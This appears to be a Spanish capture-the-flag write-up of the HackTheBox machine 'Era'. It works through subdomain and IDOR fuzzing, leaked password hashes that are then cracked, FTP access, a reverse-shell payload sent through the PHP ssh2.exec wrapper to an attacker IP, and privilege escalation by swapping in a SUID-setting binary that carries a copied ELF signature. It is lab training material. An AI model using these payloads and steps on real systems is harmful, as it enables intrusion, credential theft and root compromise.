### 1. Enumeración inicial

Añadimos el dominio a `/etc/hosts`. Hacemos un escaneo completo de puertos:

```bash
sudo nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.79 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.98 ( https://nmap.org ) at 2025-11-07 18:33 +0000
Initiating SYN Stealth Scan at 18:33
Scanning 10.10.11.79 [65535 ports]
Discovered open port 21/tcp on 10.10.11.79
Discovered open port 80/tcp on 10.10.11.79
Completed SYN Stealth Scan at 18:33, 14.44s elapsed (65535 total ports)
Nmap scan report for 10.10.11.79
Host is up, received user-set (0.074s latency).
Scanned at 2025-11-07 18:33:34 WET for 14s
Not shown: 60076 closed tcp ports (reset), 5457 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.54 seconds
           Raw packets sent: 71726 (3.156MB) | Rcvd: 60256 (2.410MB)
```

---

### 2. Enumeración web — Subdominios

La página principal no muestra contenido relevante, por lo que se procede a fuzzear subdominios usando el header `Host`:

```bash
ffuf -u http://era.htb/ -w /home/abra/Documentos/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.era.htb" -t 300 -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://era.htb/
 :: Wordlist         : FUZZ: /home/abra/Documentos/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.era.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 300
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234, Duration: 84ms]
:: Progress: [19966/19966] :: Job [1/1] :: 2115 req/sec :: Duration: [0:00:06] :: Errors: 0 ::
```
---

### 3. IDOR en descargas

Tenemos que registrarnos en http://file.era.htb/register.php. Si subimos un archivo nos encontraremos un IDOR en la URL que apunta al archivo a descargar, le haremos fuzzing a las IDs con ffuf pasandole la cookie del navegador.

```bash
ffuf -u 'http://file.era.htb/download.php?id=FUZZ' -b 'PHPSESSID=ubmm58hoc2ada64gvfdmej8f52' -w <(seq 1 20000) -fs 7686


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://file.era.htb/download.php?id=FUZZ
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Cookie: PHPSESSID=ubmm58hoc2ada64gvfdmej8f52
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 7686
________________________________________________

54                      [Status: 200, Size: 6378, Words: 2552, Lines: 222, Duration: 73ms]
150                     [Status: 200, Size: 6366, Words: 2552, Lines: 222, Duration: 78ms]
:: Progress: [20000/20000] :: Job [1/1] :: 71 req/sec :: Duration: [0:00:45] :: Errors: 0 ::
```

http://file.era.htb/download.php?id=150

http://file.era.htb/download.php?id=54

---

### 4. Base de datos SQLite

Estos dos archivos corresponden con backups. Hacemos unzip y nos encontraremos el archivo **filedb.sqlite**. Lo abriremos con una base de datos local temporal para ver su contenido:

```sql
sqlite3 filedb.sqlite

sqlite> .tables
files  users
```

Tiene dos tablas la base de datos. Miramos la tabla `users`:

```sql
sqlite> SELECT * FROM users;
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa
2|eric|$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm|-1|||
3|veronica|$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK|-1|||
4|yuri|$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.|-1|||
5|john|$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6|-1|||
6|ethan|$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC|-1|||
```

Contiene varios hashes. Los voy a guardar en un archivo:

```bash
cat > john_hashes.txt << 'EOF'
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
EOF
```
---

### 5. Cracking de hashes

Son bcrypt, los vamos a bruteforcear con `john`:

```bash
john --format=bcrypt john_hashes.txt --wordlist=/home/abra/Documentos/rockyou.txt

Using default input encoding: UTF-8
Loaded 6 password hashes with 6 different salts (bcrypt [Blowfish 32/64 X3])
Loaded hashes with cost 1 (iteration count) varying from 1024 to 4096
Will run 16 OpenMP threads
Note: Passwords longer than 24 [worst case UTF-8] to 72 [ASCII] truncated (property of the hash)
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
america          (eric)     
mustang          (yuri)     
2g 0:00:03:59 0.09% (ETA: 2025-11-10 18:23) 0.008342g/s 66.67p/s 270.9c/s 270.9C/s sean..101991
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
```

Vale, tengo la contraseña para **eric** y **yuri**. También la página permite entrar como usuario **administrador**, si le cambiamos las preguntas de seguridad (solo requiere saber el username del usuario a cambiar dichas preguntas, en este caso ya sabemos que es `admin_ef01cab31aa` por el archivo sqlite que obtenimos a través del IDOR).

---

### 6. Acceso FTP

Vamos a seguir revisando el backup. En `/download.php` hay un SSRF explotable solo por el usuario administrador, pero necesitamos algo más. **Con el usuario yuri podemos autenticarnos en ftp por el puerto 21**, con las credenciales que sacamos anteriormente.

```bash
ftp file.era.htb

Connected to era.htb.
220 (vsFTPd 3.0.5)
Name (file.era.htb:abra): yuri
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Vamos a enumerar los archivos a los que tenemos acceso:

```bash
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 apache2_conf
drwxr-xr-x    3 0        0            4096 Jul 22 08:42 php8.1_conf
226 Directory send OK.
ftp> cd php8.1_conf
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 22 08:42 build
-rw-r--r--    1 0        0           35080 Dec 08  2024 calendar.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 ctype.so
-rw-r--r--    1 0        0          190728 Dec 08  2024 dom.so
-rw-r--r--    1 0        0           96520 Dec 08  2024 exif.so
-rw-r--r--    1 0        0          174344 Dec 08  2024 ffi.so
-rw-r--r--    1 0        0         7153984 Dec 08  2024 fileinfo.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 ftp.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 gettext.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 iconv.so
-rw-r--r--    1 0        0         1006632 Dec 08  2024 opcache.so
-rw-r--r--    1 0        0          121096 Dec 08  2024 pdo.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 pdo_sqlite.so
-rw-r--r--    1 0        0          284936 Dec 08  2024 phar.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 posix.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 readline.so
-rw-r--r--    1 0        0           18696 Dec 08  2024 shmop.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 simplexml.so
-rw-r--r--    1 0        0          104712 Dec 08  2024 sockets.so
-rw-r--r--    1 0        0           67848 Dec 08  2024 sqlite3.so
-rw-r--r--    1 0        0          313912 Dec 08  2024 ssh2.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvmsg.so
-rw-r--r--    1 0        0           14600 Dec 08  2024 sysvsem.so
-rw-r--r--    1 0        0           22792 Dec 08  2024 sysvshm.so
-rw-r--r--    1 0        0           35080 Dec 08  2024 tokenizer.so
-rw-r--r--    1 0        0           59656 Dec 08  2024 xml.so
-rw-r--r--    1 0        0           43272 Dec 08  2024 xmlreader.so
-rw-r--r--    1 0        0           51464 Dec 08  2024 xmlwriter.so
-rw-r--r--    1 0        0           39176 Dec 08  2024 xsl.so
-rw-r--r--    1 0        0           84232 Dec 08  2024 zip.so
226 Directory send OK.
```
---

### 7. Reverse shell con ssh2

Cada archivo de estos corresponde con un wrapper de PHP, podemos suponer que son los wrappers que podemos usar en la web de la máquina. Voy a usar la cuenta de admin en la web, y el módulo ssh2.so para **entablar una reverse shell**. Por GET nos enviamos la reverse shell a nuestro equipo escuchando por el puerto 8000, ingresamos este payload en el propio navegador:

```url
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.209%2F8000%200%3E%261;true%27
```

```bash
❯ nc -nlvp 8000

Connection from 10.10.11.79:43182
bash: cannot set terminal process group (8089): Inappropriate ioctl for device
bash: no job control in this shell
eric@era:~$ 
```

---

### 8. Escalada de privilegios
En los backups que sacamos mediante IDOR se encuentra esto:

```bash
cat x509.genkey
[ req ]
default_bits = 2048
distinguished_name = req_distinguished_name
prompt = no
string_mask = utf8only
x509_extensions = myexts

[ req_distinguished_name ]
O = Era Inc.
CN = ELF verification
emailAddress = yurivich@era.com

[ myexts ]
basicConstraints=critical,CA:FALSE
keyUsage=digitalSignature
subjectKeyIdentifier=hash
authorityKeyIdentifier=keyid
```

Tiene el CN con ELF verification, ahora veremos la importancia de esto. Vamos a ver los grupos en los que está nuestro usuario actual eric.

```bash
eric@era:~$ id
uid=1000(eric) gid=1000(eric) groups=1000(eric),1001(devs)
```

Vemos que está en el grupo **devs**. Ahora voy a ver los archivos asociados a ese grupo **devs**:

```bash
eric@era:~$ find / -group devs 2>/dev/null
/opt/AV
/opt/AV/periodic-checks
/opt/AV/periodic-checks/monitor
/opt/AV/periodic-checks/status.log
```

Nos encontramos el archivo `/opt/AV/periodic-checks/monitor`, lo ejecuta una tarea cron como **root**, de esto nos damos cuenta al mirar el **status.log** que va variando. Tenemos permisos totales sobre el binario:

```bash
eric@era:~$ ls -l /opt/AV/periodic-checks/monitor
-rwxrwxrwx 1 root devs 765792 Nov  7 19:36 /opt/AV/periodic-checks/monitor
```

La cosa es, podemos reemplazar el binario **monitor** original por uno malicioso y que lo ejecute la tarea cron como root, pero tiene que tener la **firma ELF que vimos en el backup, de lo contrario no funcará**. 

---

### 9. Payload

Este va a ser el binario a compilar con gcc:

`monitor.c`

```c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'chmod +s /bin/bash'");
    return 0;
}
```

Esto dará **permisos SUID a /bin/bash**, como la tarea la ejecuta root podremos ganar una consola como dicho usuario.

Lo compilamos **(en nuestra máquina de atacante)**.

```bash
gcc monitor.c -o monitor -static
```

Ahora, **en la máquina víctima**, antes de eliminar o tocar nada, vamos a obtener la firma del binario original sin modificar:

```bash
objcopy --dump-section .text_sig=sig monitor
objcopy: unable to copy file 'monitor'; reason: Text file busy
```

Da error el output del comando, da igual, crea un archivo llamado sig, que es el necesario.

```bash
eric@era:/opt/AV/periodic-checks$ ls
monitor  sig  status.log
```

**Nos cargamos ahora de la máquina victima el binario monitor original, y le pasamos el nuestro malicioso**. Se puede pasar de mil maneras diferentes, yo lo haré hosteando un servidor temporal en mi máquina de atacante y obteniendolo en la víctima por wget.

```bash
eric@era:/opt/AV/periodic-checks$ wget http://10.10.14.209/monitor
--2025-11-07 20:13:06--  http://10.10.14.209/monitor
Connecting to 10.10.14.209:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847144 (827K) [application/octet-stream]
Saving to: ‘monitor’

monitor             100%[===================>] 827.29K  1.66MB/s    in 0.5s    

2025-11-07 20:13:06 (1.66 MB/s) - ‘monitor’ saved [847144/847144]
```

**Ahora le agregamos la firma del binario original en la máquina víctima**.

```bash
objcopy --add-section .text_sig=sig monitor
```

```bash
chmod +x monitor
```

---

### 10. Root

Ya con esto ganamos acceso como root:

```shell
eric@era:/opt/AV/periodic-checks$ bash -p
bash-5.1# whoami
root
bash-5.1# 
```